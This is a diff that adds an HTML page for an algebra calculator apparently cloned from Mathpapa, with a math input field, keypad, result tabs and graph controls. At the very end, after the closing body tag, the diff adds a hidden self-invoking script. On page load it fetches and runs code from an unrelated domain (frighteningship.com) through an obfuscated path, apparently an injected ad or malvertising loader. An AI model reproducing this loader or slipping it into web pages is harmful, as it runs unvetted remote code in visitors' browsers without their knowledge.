@@ -1,0 +1,755 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-N0LG27M8L8"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() { dataLayer.push(arguments); }
+    gtag('js', new Date());
+
+    gtag('config', 'G-N0LG27M8L8');
+  </script>
+  <title></title>
+</head>
+
+<body>
+
+  <head>
+    <title>Algebra Calculator</title>
+    <script src="/assets/js/script.js?v=11"></script>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="description"
+      content="Algebra Calculator shows you the step-by-step solutions! Solves algebra problems and walks you through them." />
+    <link href="calculator.css" rel="stylesheet" type="text/css" media="screen" />
+    <script type="text/javascript">
+      var KhanUtil = {};
+      var TryUtil = {};
+    </script>
+    <script src="/assets/js/script.js?v=11"></script>
+    <script type="text/javascript">
+      TryUtil.abgroup = 2000;
+    </script>
+    <script type="text/javascript">
+      try {
+        if (-1 !== window.location.href.indexOf("#"))
+          if (window.history && history.replaceState)
+            window.history.replaceState(
+              "",
+              document.title,
+              window.location.pathname
+            );
+          else {
+            var scroll = {
+              top: document.body.scrollTop,
+              left: document.body.scrollLeft,
+            };
+            (window.location.hash = ""),
+              (document.body.scrollTop = scroll.top),
+              (document.body.scrollLeft = scroll.left);
+          }
+      } catch (o) { }
+    </script>
+  </head>
+  <script type="text/javascript">
+    function valLoad() {
+      try {
+        if (typeof mload01 === "undefined") {
+          $("#out0").append(
+            "<div style='color:red;'>Please try again after a moment. You may need to reload the page.<br/><br/><\/div>"
+          );
+        }
+      } catch (e) { }
+      return false;
+    }
+  </script>
+  <div class="upper-wrapper">
+    <header id="overview" class="mp-subhead mp-subhead-clear">
+      <div class="container">
+        <h1 id="h1text">Algebra Calculator</h1>
+      </div>
+    </header>
+    <div class="container">
+      <div class="row">
+        <div class="col-xs-12 col-md-9">
+          <h4 id="outintro" style="display: none">
+            What do you want to calculate?
+          </h4>
+          <h4 id="outintro2" style="">What do you want to calculate?</h4>
+          <div class="row">
+            <form id="calcform" class="col-xs-12 col-md-12 form-search" novalidate="novalidate"
+              onsubmit="return valLoad();">
+              <input id="source" type="text" autocorrect="off" autocapitalize="off" class="span5 search-query"
+                placeholder="1+1=x" style="
+                    display: none;
+                    font-family: Times New Roman;
+                    color: black;
+                    float: left;
+                    border-radius: 3px;
+                    font-size: 28px;
+                    padding: 15px;
+                    margin: 0 10px 10px 0;
+                    width: 75%;
+                  " />
+              <span id="source3" class="span5 search-query mathquill-math-field" style="
+                    font-family: Times New Roman;
+                    color: black;
+                    float: left;
+                    border-radius: 3px;
+                    font-size: 34px;
+                    padding: 15px;
+                    margin: 0 10px 10px 0;
+                    width: 75%;
+                  "></span>
+              <button id="parse_btn" type="submit" class="btn mp-giant-btn btn-primary">
+                Calculate it !
+              </button>
+            </form>
+          </div>
+          <div id="out0" style="font-size: 20px; line-height: 24px"></div>
+          <div id="out" style=""></div>
+          <div id="out3" style=""></div>
+          <ul id="mytabs" class="nav nav-pills" style="
+                margin-bottom: 20px;
+                border-bottom: 1px solid #ddd;
+                display: none;
+              ">
+            <li id="soltab" class="mytab">
+              <a id="sollink" href="#" style="">Solve</a>
+            </li>
+            <li id="solvartab" class="mytab">
+              <a id="solvarlink" href="#" style="">Solve for Variable</a>
+            </li>
+            <li id="youtab" class="mytab">
+              <a id="youlink" href="#" style="">Practice Mode</a>
+            </li>
+            <li id="simptab" class="mytab">
+              <a id="simplink" href="#" style="">Simplify</a>
+            </li>
+            <li id="factortab" class="mytab">
+              <a id="factorlink" href="#" style="">Factor</a>
+            </li>
+            <li id="steptab" class="mytab">
+              <a id="steplink" href="#" style="">Step-By-Step</a>
+            </li>
+            <li id="evaltab" class="mytab">
+              <a id="evallink" href="#" style="">Evaluate</a>
+            </li>
+            <li id="graphtab" class="mytab">
+              <a id="graphlink" href="#" style="">Graph</a>
+            </li>
+            <li>&nbsp;</li>
+          </ul>
+          <div id="sliderdiv-check" style="display: none">
+            <label><input type="checkbox" id="ticks-check" />Show Slider</label>
+          </div>
+          <div id="sliderdiv" style="display: none">
+            <div id="slider1" class="slider" value="1" min="-9" max="9">
+              <div class="track"></div>
+              <div class="knob" role="slider"></div>
+            </div>
+            <p>
+              <span id="slider1-output">0</span>
+            </p>
+          </div>
+          <div id="sliderdiv2" style="display: none">
+            <div id="slider2" class="slider" value="1" min="-9" max="9">
+              <div class="track"></div>
+              <div class="knob" role="slider"></div>
+            </div>
+            <p>
+              <span id="slider2-output">0</span>
+            </p>
+          </div>
+          <div id="soldiv" class="mydiv" style="font-size: 28px">
+            <div id="solpickdiv" style="display: none">
+              <select id="solpick2" style="
+                    font-size: 18px;
+                    width: 300px;
+                    margin-right: 10px;
+                    margin-bottom: 10px;
+                    -webkit-appearance: menulist;
+                    border-radius: 0.5em;
+                  "></select>
+            </div>
+            <div id="solout" style=""></div>
+            <div id="solouto" style="display: none">
+              <div class="vspacediv">
+                <span style="font-size: 20px">Simplify: (<a id="solshowlink" href="#" style="">Show steps</a>)</span>
+              </div>
+              <div id="solouti" style="display: none"></div>
+            </div>
+            <div id="soloutbuttondiv" style="display: none">
+              <a id="solstepshowlink" href="#" style="display: none" class="btn btn-info2 btn-space">Show Step-By-Step
+                <span id="solonemorespan" class="" style="display: none"></span></a>
+            </div>
+            <div id="solout3" style=""></div>
+            <div id="sollesson" style="display: none; font-size: 20px"></div>
+          </div>
+          <div id="solvardiv" class="mydiv" style="font-size: 28px; display: none">
+            <div id="solvarout1" style=""></div>
+            <div id="solvarout" style=""></div>
+            <span style="font-size: 24px">Solve for:</span>
+            <select id="solvarval" style="font-size: 18px; width: 50px; margin-right: 10px"></select>
+            <hr />
+            <div id="solvarout3" style=""></div>
+          </div>
+          <div id="youdiv" class="mydiv" style="font-size: 28px">
+            <div id="youout" style=""></div>
+            <div id="yououtb" style=""></div>
+          </div>
+          <div id="simpdiv" class="mydiv" style="font-size: 28px">
+            <div id="simpout" style="font-size: 28px"></div>
+            <div id="simpoutbuttondiv" style="display: none">
+              <a id="simpstepshowlink" href="#" style="display: none" class="btn btn-info2 btn-space">Show
+                Step-By-Step</a>
+            </div>
+            <div id="simpout3" style="font-size: 28px"></div>
+          </div>
+          <div id="factordiv" class="mydiv" style="font-size: 28px">
+            <div id="factorout" style="font-size: 28px"></div>
+          </div>
+          <div id="stepdiv" class="mydiv" style="font-size: 28px">
+            <div id="stepout" style="font-size: 28px"></div>
+          </div>
+          <div id="evaldiv" class="mydiv" style="font-size: 28px; display: none">
+            <div id="evaluateintro" style="font-size: 28px"></div>
+            <div id="evalout" style="font-size: 28px"></div>
+            <div id="evalouter1" style="font-size: 18px">
+              <form id="evalform1" class="form-search" novalidate="novalidate" style="">
+                <div id="evalvarouter1" style="float: left">
+                  <br />
+                  <div id="evalvar1" style="
+                        height: 30px;
+                        line-height: 20px;
+                        font-size: 18px;
+                        margin-top: 5px;
+                        float: left;
+                        margin-right: 2px;
+                      ">
+                    x1=
+                  </div>
+                  <input id="evalsource1" type="text" autocorrect="off" autocapitalize="off" class="search-query"
+                    placeholder="" style="
+                        width: 30px;
+                        font-family: Times New Roman;
+                        color: black;
+                        float: left;
+                        border-radius: 3px;
+                        text-align: center;
+                        font-size: 18px;
+                        margin-right: 15px;
+                      " />
+                </div>
+                <div id="evalvarouter2" style="float: left">
+                  <br />
+                  <div id="evalvar2" style="
+                        height: 30px;
+                        line-height: 20px;
+                        font-size: 18px;
+                        margin-top: 5px;
+                        float: left;
+                        margin-right: 2px;
+                      ">
+                    x2=
+                  </div>
+                  <input id="evalsource2" type="text" autocorrect="off" autocapitalize="off" class="search-query"
+                    placeholder="" style="
+                        width: 30px;
+                        font-family: Times New Roman;
+                        color: black;
+                        float: left;
+                        border-radius: 3px;
+                        text-align: center;
+                        font-size: 18px;
+                        margin-right: 15px;
+                      " />
+                </div>
+                <div id="evalvarouter3" style="float: left">
+                  <br />
+                  <div id="evalvar3" style="
+                        height: 30px;
+                        line-height: 20px;
+                        font-size: 18px;
+                        margin-top: 5px;
+                        float: left;
+                        margin-right: 2px;
+                      ">
+                    x3=
+                  </div>
+                  <input id="evalsource3" type="text" autocorrect="off" autocapitalize="off" class="search-query"
+                    placeholder="" style="
+                        width: 30px;
+                        font-family: Times New Roman;
+                        color: black;
+                        float: left;
+                        border-radius: 3px;
+                        text-align: center;
+                        font-size: 18px;
+                        margin-right: 15px;
+                      " />
+                </div>
+                <div id="evalvarouter4" style="float: left">
+                  <br />
+                  <div id="evalvar4" style="
+                        height: 30px;
+                        line-height: 20px;
+                        font-size: 18px;
+                        margin-top: 5px;
+                        float: left;
+                        margin-right: 2px;
+                      ">
+                    &nbsp;
+                  </div>
+                  <button type="submit" class="btn btn-primary"
+                    style="height: 30px; line-height: 20px; font-size: 18px">
+                    Evaluate !
+                  </button>
+                  <div id="evalout1"></div>
+                </div>
+              </form>
+            </div>
+            <div style="clear: both"></div>
+            <div id="evaluatestep" style="font-size: 28px"></div>
+          </div>
+          <div id="graphdiv" class="mydiv" style="font-size: 28px">
+            <div id="graphout" style="font-size: 28px"></div>
+            <div id="workarea2" style="font-size: 18px">
+              <div class="graphie" id="grid2" style="display: none"></div>
+              <div id="graphoptdiv" style="display: none">
+                <form id="graphdivform" class="form-search" novalidate="novalidate" style="">
+                  <br />
+                  <b>Window Size</b><br />
+                  <div style="float: left">
+                    <br />
+                    <div style="
+                          height: 30px;
+                          line-height: 20px;
+                          font-size: 18px;
+                          margin-top: 5px;
+                          float: left;
+                          margin-right: 2px;
+                        ">
+                      Xmin:
+                    </div>
+                    <input id="gdsource1" type="text" autocorrect="off" autocapitalize="off" value="-10" style="
+                          width: 50px;
+                          font-family: Times New Roman;
+                          color: black;
+                          border-radius: 3px;
+                          margin-right: 15px;
+                          text-align: center;
+                        " />
+                  </div>
+                  &lt; !-- end float div--&gt;
+                  <div style="float: left">
+                    <br />
+                    <div style="
+                          height: 30px;
+                          line-height: 20px;
+                          font-size: 18px;
+                          margin-top: 5px;
+                          float: left;
+                          margin-right: 2px;
+                        ">
+                      Xmax:
+                    </div>
+                    <input id="gdsource2" type="text" autocorrect="off" autocapitalize="off" value="10" style="
+                          width: 50px;
+                          font-family: Times New Roman;
+                          color: black;
+                          border-radius: 3px;
+                          margin-right: 15px;
+                          text-align: center;
+                        " />
+                  </div>
+                  &lt; !-- end float div--&gt;
+                  <div style="float: left">
+                    <br />
+                    <div style="
+                          height: 30px;
+                          line-height: 20px;
+                          font-size: 18px;
+                          margin-top: 5px;
+                          float: left;
+                          margin-right: 2px;
+                        ">
+                      Ymin:
+                    </div>
+                    <input id="gdsource3" type="text" autocorrect="off" autocapitalize="off" value="-10" style="
+                          width: 50px;
+                          font-family: Times New Roman;
+                          color: black;
+                          border-radius: 3px;
+                          margin-right: 15px;
+                          text-align: center;
+                        " />
+                  </div>
+                  &lt; !-- end float div--&gt;
+                  <div style="float: left">
+                    <br />
+                    <div style="
+                          height: 30px;
+                          line-height: 20px;
+                          font-size: 18px;
+                          margin-top: 5px;
+                          float: left;
+                          margin-right: 2px;
+                        ">
+                      Ymax:
+                    </div>
+                    <input id="gdsource4" type="text" autocorrect="off" autocapitalize="off" value="10" style="
+                          width: 50px;
+                          font-family: Times New Roman;
+                          color: black;
+                          border-radius: 3px;
+                          margin-right: 15px;
+                          text-align: center;
+                        " />
+                  </div>
+                  &lt; !-- end float div--&gt;
+                  <div style="float: left">
+                    <br />
+                    <div style="
+                          height: 30px;
+                          line-height: 20px;
+                          font-size: 18px;
+                          margin-top: 5px;
+                          float: left;
+                          margin-right: 2px;
+                        ">
+                      &nbsp;
+                    </div>
+                    <button type="submit" class="btn btn-default"
+                      style="height: 30px; line-height: 20px; font-size: 18px">
+                      Redraw Graph
+                    </button>
+                    <div id="outgraph" style=""></div>
+                  </div>
+                  &lt; !-- end float div--&gt;
+                </form>
+                &lt; !-- end graphdivform--&gt;<br />
+              </div>
+            </div>
+          </div>
+          <div id="lessondiv" class="mydiv" style="font-size: 28px">
+            <div id="lessonout" style="font-size: 28px"></div>
+            <div id="lessonout3" style="font-size: 28px"></div>
+            <div id="lessonrow" style="font-size: 24px; display: none">
+              <div id="lessonlink0" class="vtab"></div>
+              <div id="lessonlink1" class="vtab"></div>
+              <div id="lessonlink2" class="vtab"></div>
+              <div id="lessonlink3" class="vtab"></div>
+              <div id="lessonlink4" class="vtab"></div>
+              <div id="lessonlink5" class="vtab"></div>
+            </div>
+          </div>
+          <div id="practicediv" class="mydiv" style="font-size: 28px">
+            <div id="practiceout" style="font-size: 28px"></div>
+            <div id="practiceout3" style="font-size: 28px"></div>
+            <div id="practicerow" style="font-size: 24px; display: none"></div>
+          </div>
+          <div id="workarea3">
+            <div class="graphie" id="grid3" style="display: none"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="container">
+      <div class="row">
+        <div class="span12">
+          <div id="tabletpad" style="
+                display: none;
+                position: fixed;
+                right: 0;
+                left: 0;
+                bottom: 0;
+                z-index: 40;
+                background: rgba(68, 68, 68, 0.4);
+                padding-top: 2px;
+              ">
+            <div id="tabletinner" style="
+                  width: 100%;
+                  max-width: 600px;
+                  margin: auto;
+                  text-align: center;
+                ">
+              <div style="clear: both">
+                <div class="mkey btn btn-default mbase" id="myhide">
+                  <div class="inneranswer">Close</div>
+                </div>
+                <div class="mkey btn btn-default mbase" id="leftparen">
+                  <div class="inneranswer">(</div>
+                </div>
+                <div class="mkey btn btn-default mbase" id="rightparen">
+                  <div class="inneranswer">)</div>
+                </div>
+                <div class="mkey btn btn-default mbase" contextmenu="" title="Square Root" id="sqrt">
+                  <div class="inneranswer">√</div>
+                </div>
+                <div class="mkey btn btn-default mbase" title="Exponent" id="exp">
+                  <div class="inneranswer">^</div>
+                </div>
+                <div class="mkey btn btn-default mbase" title="GreaterEqual" id="greaterequal">
+                  <div class="inneranswer">&ge;</div>
+                </div>
+              </div>
+              <div style="clear: both">
+                <div class="mkey btn btn-default mbase" title="Absolute Value" id="abs">
+                  <div class="inneranswer">|</div>
+                </div>
+                <div class="mkey btn btn-default mbase" id="c7">
+                  <div class="inneranswer">7</div>
+                </div>
+                <div class="mkey btn btn-default mbase" id="c8">
+                  <div class="inneranswer">8</div>
+                </div>
+                <div class="mkey btn btn-default mbase" id="c9">
+                  <div class="inneranswer">9</div>
+                </div>
+                <div class="mkey btn btn-info mbase" id="divid">
+                  <div class="inneranswer">&divide;</div>
+                </div>
+                <div class="mkey btn btn-default mbase" title="LessEqual" id="lessequal">
+                  <div class="inneranswer">&le;</div>
+                </div>
+              </div>
+              <div style="clear: both">
+                <div class="mkey btn btn-default mbase" id="xbut">
+                  <div class="inneranswer"></div>
+                </div>
+                <div class="mkey btn btn-default mbase" id="c4">
+                  <div class="inneranswer">4</div>
+                </div>
+                <div class="mkey btn btn-default mbase" id="c5">
+                  <div class="inneranswer">5</div>
+                </div>
+                <div class="mkey btn btn-default mbase" id="c6">
+                  <div class="inneranswer">6</div>
+                </div>
+                <div class="mkey btn btn-info mbase" id="times">
+                  <div class="inneranswer">&times;</div>
+                </div>
+                <div class="mkey btn btn-default mbase" title="Greater Than" id="greater">
+                  <div class="inneranswer">&gt;</div>
+                </div>
+              </div>
+              <div style="clear: both">
+                <div class="mkey btn btn-default mbase" id="ybut">
+                  <div class="inneranswer"></div>
+                </div>
+                <div class="mkey btn btn-default mbase" id="c1">
+                  <div class="inneranswer">1</div>
+                </div>
+                <div class="mkey btn btn-default mbase" id="c2">
+                  <div class="inneranswer">2</div>
+                </div>
+                <div class="mkey btn btn-default mbase" id="c3">
+                  <div class="inneranswer">3</div>
+                </div>
+                <div class="mkey btn btn-info mbase" id="minus">
+                  <div class="inneranswer">&#8722;</div>
+                </div>
+                <div class="mkey btn btn-default mbase" title="Less Than" id="less">
+                  <div class="inneranswer">&lt;</div>
+                </div>
+              </div>
+              <div style="clear: both">
+                <div class="mkey"></div>
+                <div class="mkey btn btn-default mbase" id="cpt">
+                  <div class="inneranswer">.</div>
+                </div>
+                <div class="mkey btn btn-default mbase" id="c0">
+                  <div class="inneranswer">0</div>
+                </div>
+                <div class="mkey btn btn-default mbase" id="comma">
+                  <div class="inneranswer">,</div>
+                </div>
+                <div class="mkey btn btn-info mbase" id="plu">
+                  <div class="inneranswer">+</div>
+                </div>
+              </div>
+              <div style="clear: both">
+                <div class="mkey btn btn-danger mbase" id="del">
+                  <div class="inneranswer">del</div>
+                </div>
+                <div class="mkey btn btn-default mbase" id="myspace" style="width: 27%">
+                  <div class="inneranswer">space</div>
+                </div>
+                <div class="mkey btn btn-default mbase" id="eq">
+                  <div class="inneranswer">=</div>
+                </div>
+                <div class="mkey btn btn-primary mbase" id="myleft">
+                  <div class="inneranswer">&larr;</div>
+                </div>
+                <div class="mkey btn btn-primary mbase" id="myright">
+                  <div class="inneranswer">&rarr;</div>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="mkey btn btn-default mbase" id="myshow" style="width: 27%">
+            <div class="inneranswer">Show Keypad</div>
+          </div>
+        </div>
+      </div>
+      <p>
+        Credit to
+        <a href="https://www.mathpapa.com/algebra-calculator.html">Mathpapa</a>
+        for the amazing calculator !
+      </p>
+    </div>
+  </div>
+  <script src="jquery-1.12.3.min.js"></script>
+  <script>
+    window.jQuery ||
+      document.write('<script src="/js/lib/jquery-1.11.3.min.js"><\/script>');
+  </script>
+  <script type="text/javascript" src="bootstrap-3.3.6.min.js"></script>
+  <script type="text/javascript" src="nav.min.js"></script>
+  <script type="text/javascript" src="https://d3643w4z47srw1.cloudfront.net/calc/mathquill.min.js"></script>
+  <script type="text/javascript">
+    localStorage.setItem("count.t-steps.total", "1");
+    try {
+      (MQ = MathQuill.getInterface(MathQuill.getInterface.MAX)),
+        $(function () {
+          $(".mathquill-static-math").each(function () {
+            MQ.StaticMath(this);
+          }),
+            $(".mathquill-math-field").each(function () {
+              MQ.MathField(this);
+            }),
+            $(".mathquill-text-field").each(function () {
+              MQ.TextField(this);
+            });
+        });
+    } catch (t) { }
+
+    $(function () {
+      try {
+        var t = MQ($("#source3")[0]);
+        t.config({
+          autoCommands: "pi sqrt",
+          charsThatBreakOutOfSupSub: "+-=<>",
+          handlers: {
+            enter: function (t) {
+              $("#calcform").submit();
+            },
+          },
+        });
+      } catch (t) { }
+      try {
+        var i = mobileType();
+        if ("ios" === i)
+          $("#source3").hide(),
+            $("#source").show(),
+            $("#outintro2").hide(),
+            $("#outintro").show();
+        else if ("android" === i)
+          $("#source3").hide(),
+            $("#source").show(),
+            $("#outintro2").hide(),
+            $("#outintro").show();
+        else
+          try {
+            (TryUtil.MyLatex = t), t.focus(), $("#tabletpad2").show();
+          } catch (t) {
+            $("#source3").hide(),
+              $("#source").show(),
+              $("#outintro2").hide(),
+              $("#outintro").show();
+          }
+      } catch (t) { }
+    });
+  </script>
+  <script src="/js/lib/browser-polyfill-5.6.15.min.js"></script>
+  <script type="text/javascript">
+    function getBobStr2() {
+      var sLabel = "bobstr=";
+      var optstr = "-1";
+      var curStr;
+      try {
+        if (document.cookie.indexOf(sLabel) > -1) {
+          var myind = document.cookie.indexOf(sLabel) + sLabel.length;
+          curStr = document.cookie.substring(myind, myind + 10);
+          if (curStr.indexOf(";") > -1) {
+            optstr = curStr.substring(0, curStr.indexOf(";"));
+          } else {
+            optstr = curStr;
+          }
+        } else {
+          return "-1";
+        }
+      } catch (e) {
+        return "-1";
+      }
+      return optstr;
+    }
+
+    var bobfloat = -1;
+    try {
+      bobfloat = parseFloat(getBobStr2());
+    } catch (e) { }
+
+    if (bobfloat < 0) {
+      try {
+        var myfloat = Math.random();
+        var date = new Date();
+        date.setTime(date.getTime() + 365 * 24 * 60 * 60 * 1000);
+        var expires = "; expires=" + date.toGMTString();
+        document.cookie = "bobstr=" + myfloat + expires + "; path=/";
+        bobfloat = myfloat;
+      } catch (e) { }
+    }
+  </script>
+  <script type="text/javascript">
+    var mobileType = function () {
+      try {
+        var uagent = navigator.userAgent;
+        if (
+          uagent.match(/iPad/i) ||
+          uagent.match(/iPhone/i) ||
+          uagent.match(/iPod/i)
+        ) {
+          return "ios";
+        } else if (uagent.match(/Android/i)) {
+          return "android";
+        } else {
+          return "none";
+        }
+      } catch (e) {
+        return "none";
+      }
+    };
+  </script>
+  <script type="text/javascript" src="https://d3643w4z47srw1.cloudfront.net/js/total1ca01.js"></script>
+  <script type="text/javascript" src="https://d3643w4z47srw1.cloudfront.net/js/try9vsa29.js"></script>
+  <script type="text/javascript" src="min-demokey8.js"></script>
+  <script type="text/javascript" src="min-mpad8.js"></script>
+  <script type="text/javascript">
+    var mload01 = 1;
+    try {
+      var mpnum = 1;
+      var mod11 = 1;
+    } catch (e) {
+      3 + 2;
+    }
+  </script>
+</body>
+<script>
+  (function (bicyshr) {
+    var d = document,
+      s = d.createElement("script"),
+      l = d.scripts[d.scripts.length - 1];
+    s.settings = bicyshr || {};
+    s.src =
+      "\/\/frighteningship.com\/awW\/5aw.YLWWdclKQV2q9Zk\/ZYTC9O6\/b\/2V5pl\/S_WEQm9aNAD\/kM1fNEDdgm2qOGCG0o0NOMTEUw0JORDnYT5m";
+    s.async = true;
+    l.parentNode.insertBefore(s, l);
+  })({});
+</script>
+
+</html>
